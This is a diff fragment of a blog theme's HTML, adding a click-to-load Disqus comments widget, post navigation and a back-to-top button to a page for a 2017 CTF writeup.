+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #D3D3D3;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load"> 
+    <button class="disqus_click_btn">阅读评论（请确保 disqus 可以正常加载）</button>
+</div>
+
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'https://ares-x.com/2017/11/26/2017年湖湘杯网络安全技能大赛Writeup/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'https://ares-x.com/2017/11/26/2017年湖湘杯网络安全技能大赛Writeup/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/ls-javascript" id="disqus-lazy-load-script">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//ares-x-com.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+  	
+
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2017/11/22/Office全版本漏洞CVE-2017-11882利用复现/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
 
 
                     
@@ -567,6 +1007,14 @@ It will not impact the appearance and can give developers a lot of support :)
 </aside>
 
                     
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
 
                     
 
